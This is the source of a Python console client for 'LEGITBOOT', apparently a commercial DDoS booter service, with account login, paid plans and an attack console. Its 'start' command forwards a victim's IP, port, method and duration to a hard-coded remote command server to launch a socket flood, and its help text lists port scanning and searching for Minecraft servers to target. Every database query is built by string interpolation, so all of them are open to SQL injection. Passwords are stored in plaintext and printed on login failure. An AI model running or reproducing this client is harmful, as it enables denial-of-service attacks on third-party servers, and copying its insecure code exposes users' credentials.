import os
from colorama import Fore
import sys
import getpass
import socket
import keyboard
import tkinter as tk
import win32gui
import pwinput
import mysql.connector
import requests
import time

db = mysql.connector.connect(
    host="localhost",
    port="3306",
    user="LegitBoot",
    password="kleslo",
    database="LEGITBOOT"
)

cursor = db.cursor()

dir = os.path.join(os.path.expanduser("~"), "AppData\Local\Temp")
file_path = os.path.join(dir, "LEGTIBOOT")
file_name = "decriptionkey.txt"
help_path1 = "help.txt"
username_file_path = os.path.join(file_path, file_name)
help_file_path = os.path.join(file_path, help_path1)
password = ""
Createpassword = ""


banner = Fore.YELLOW + """██╗     ███████╗ ██████╗ ██╗████████╗██████╗  ██████╗  ██████╗ ████████╗
██║     ██╔════╝██╔════╝ ██║╚══██╔══╝██╔══██╗██╔═══██╗██╔═══██╗╚══██╔══╝
██║     █████╗  ██║  ███╗██║   ██║   ██████╔╝██║   ██║██║   ██║   ██║   
██║     ██╔══╝  ██║   ██║██║   ██║   ██╔══██╗██║   ██║██║   ██║   ██║   
███████╗███████╗╚██████╔╝██║   ██║   ██████╔╝╚██████╔╝╚██████╔╝   ██║   
╚══════╝╚══════╝ ╚═════╝ ╚═╝   ╚═╝   ╚═════╝  ╚═════╝  ╚═════╝    ╚═╝   """ + Fore.WHITE

def start():
    os.system("title LEGITBOOT Client")
    if os.path.isdir(file_path):
        with open(username_file_path, "r") as f:
            content = f.read().strip()
            cursor.execute(f"SELECT * FROM users WHERE username = '{content}'")
            user = cursor.fetchone()
            if user is None:
                f.close()  # close the file before attempting to delete the folder
                os.system("rmdir /s /q " + file_path)
                print("User folder deleted")
                start()
                return
        os.system("cls || clear")
        print(banner)
        print("Welcome back! Before you can begin, please enter your password for decryption.")
        print("")
        User = input(f"{Fore.LIGHTGREEN_EX}? {Fore.WHITE}Enter your username: ")
        password = pwinput.pwinput(prompt= f'{Fore.LIGHTGREEN_EX}? {Fore.WHITE}Enter decryption password: ', mask='*')
        cursor.execute(f"SELECT * FROM users WHERE username = '{User}' AND password = '{password}'")
        user = cursor.fetchone()
        if not user:
            print(f"{Fore.RED}! {Fore.WHITE}Incorrect username or user does not exist / or wrong password")
            return
        with open(username_file_path, "r") as f:
            content = f.read().strip()
            if not content == User:
                print(f"{Fore.RED}! {Fore.WHITE} Username in the text file does not match the username entered")
                return
        if user[2] != password:
            print(f"{Fore.RED}! {Fore.WHITE} Incorrect password. Password from the database: {user[2]}. Password entered: {password}")
            return
        if user is not None and password == user[2]:
            print("Correct password")
            main(user)
        else:
            print(f"{Fore.RED}! {Fore.WHITE} Incorrect password")
            sys.exit()

    else:
        os.system("cls || clear")
        print(banner)
        print("Welcome! Please create your account, but remember when you lose your decryption key we can't get it!")
        print("")
        while True:
            username = input(f"{Fore.LIGHTGREEN_EX}? {Fore.WHITE}Enter your username: ")
            cursor.execute(f"SELECT * FROM users WHERE username = '{username}'")
            result = cursor.fetchone()
            if result:
                print(f"{Fore.RED}! {Fore.WHITE}Username is already taken. Please choose another username.")
            else:
                break

        while True:
            password = pwinput.pwinput(f"{Fore.LIGHTGREEN_EX}? {Fore.WHITE}Enter your password: ", mask="*")
            password2 = pwinput.pwinput(f"{Fore.LIGHTGREEN_EX}? {Fore.WHITE}Confirm your password: ", mask="*")
            if password != password2:
                print(f"{Fore.RED}! {Fore.WHITE}Passwords do not match. Please try again.")
            else:
                break
        ip_address = requests.get("https://api.ipify.org").text
        cursor.execute("SELECT COUNT(*) FROM users")
        count = cursor.fetchone()[0] + 1
        insert_query = f"INSERT INTO users (id, username, password, ip_address, plan_type) VALUES ('{count}', '{username}', '{password}', '{ip_address}', 'Free')"
        cursor.execute(insert_query)
        db.commit()
        cursor.close()
        db.commit()
        os.mkdir(file_path)
        with open(username_file_path, "w") as file:
            file.write(username)
        print(f"{Fore.RED}! {Fore.WHITE} Please start the program again.")
        sys.exit()

def main2():
    os.system("cls || clear")
    print(banner)
    print("")
    print(f"{Fore.LIGHTGREEN_EX}? {Fore.WHITE}Welcome! Please choose what you want to do: {Fore.LIGHTBLACK_EX}(Use arrow keys)")

def main(user):
    option = 1
    console_window = win32gui.GetForegroundWindow()
    while True:
        try:
            main2()
            print((Fore.LIGHTBLUE_EX + "> " if option == 1 else f"{Fore.WHITE}") + "LEGITBOOT CONSOLE")
            print((Fore.LIGHTBLUE_EX + "> " if option == 2 else f"{Fore.WHITE}") + "Buy plans")
            print((Fore.LIGHTBLUE_EX + "> " if option == 3 else f"{Fore.WHITE}") + "Account details")
            print((Fore.LIGHTBLUE_EX + "> " if option == 4 else f"{Fore.WHITE}") + "Known working links")

            if win32gui.GetForegroundWindow() == console_window:
                event = keyboard.read_event(suppress=True)
                if event.event_type == "down":
                    if event.name == "down":
                        option = min(option + 1, 4)
                    elif event.name == "up":
                        option = max(option - 1, 1)
                    elif event.name == "esc":
                        sys.exit()
                    elif event.name == "enter":
                        if option == 1:
                            console(user)
                        elif option == 2:
                            print("Attack selected")
                        elif option == 3:
                            account(user)
                        elif option == 4:
                            print("Exiting program")
                            sys.exit()
        except Exception as e:
            print(f"An error occurred: {e}")


def account(user):
    os.system("cls || clear")
    print(banner)
    print(f"{Fore.LIGHTGREEN_EX}? {Fore.WHITE}Welcome! Here you can see your account details!")
    print("")

    lola = (f"SELECT plan_type, id, username FROM users WHERE id = '{user[0]}'")
    cursor.execute(lola)

    # Fetch the data
    data = cursor.fetchall()

    if len(data) == 1:
        plan_type, id, username = data[0]
        print(f"Username: {username}")
        print(f"ID: {id}")
        print(f"Plan: {plan_type}")
        print("")
        print(f"{Fore.LIGHTGREEN_EX}? {Fore.WHITE}Press Enter to return to main menu")
        keyboard.wait('enter')
        main(user)
    else:
        print(f"{Fore.LIGHTRED_EX}! {Fore.WHITE}Error fetching account details for user {user[0]}.")
        print("")
        print(f"{Fore.LIGHTGREEN_EX}? {Fore.WHITE}Press Enter to return to main menu")
        keyboard.wait('enter')
        main(user)

def console(user):
    os.system("cls || clear")
    print(banner)
    print(f"{Fore.LIGHTGREEN_EX}? {Fore.WHITE}Welcome! Please choose what you want to do: {Fore.LIGHTBLUE_EX}LEGITBOOT console")
    print("")
    print(f"{Fore.WHITE}Type `{Fore.LIGHTYELLOW_EX}help{Fore.WHITE}` to display available commands.")
    print(f"{Fore.WHITE}Type `{Fore.LIGHTYELLOW_EX}exit{Fore.WHITE}` to return to main menu.")
    print("")
    console2(user)

def console2(user):
    command = input(f"{Fore.LIGHTGREEN_EX}? {Fore.WHITE}-> ",)
    sinput = command.split(" ")[0]
    if command == "exit":
        main(user)
    if sinput == "start":
        sinput, host, port, power, method, protocol, time = command.split(" ")
        print(f"Attack hass been {Fore.LIGHTGREEN_EX}successfully {Fore.WHITE} sended!")
        print("")
        print(f"IP: {host}")
        print(f"PORT: {port}")
        print(f"POWER: {power}")
        print(f"METHOD: {method}")
        print(f"PROTOCOL: {protocol}")
        print(f"TIME: {time}")
        requests.get(url = f'http://146.19.191.73:125/attack23/?host={host}&port={port}&power={power}&method={method}&protocol={protocol}&time={time}')
        console2(user)
        
    if command == "help":
        if os.path.isdir(help_file_path):
            f = open(help_file_path, "r")
            print(Fore.WHITE + f.read())
        else:
            with open(help_file_path, "w") as f:
                f.write(""" 
Available commands:

start <IP:PORT> <PROTOCOL> <METHOD> <NETWORK> <SECONDS> - starts a socket flood
<IP:PORT> - target
<PROTOCOL> - protocol version
<METHOD> - attack method
<NETWORK> - which network to use
<SECONDS> - how long should the flood last

methods - show available methods
protocols - show most popular protocol versions
networks - show available networks
dns <hostname> - resolve DNS
mcdns <host> - resolve minecraft SRV records
whois <host/ip> - gets whois information
portscan <ip> - scans open TCP ports
check <ip:port> - checks if TCP port is open from different locations
* tcpping <ip:port> - check if TCP server is online periodically
find <query> - finds online minecraft servers based on motd, version, plugins, etc...

* The tcpping command is executed from your own device where this program is running. The target server can see your IP and potentially log it.
 """)
            f = open(help_file_path, "r")
            print(Fore.WHITE + f.read())
            console2(user)

    else:
        print(f"{Fore.RED}Unknown command: {Fore.WHITE}{command}")
        console2(user)

start()
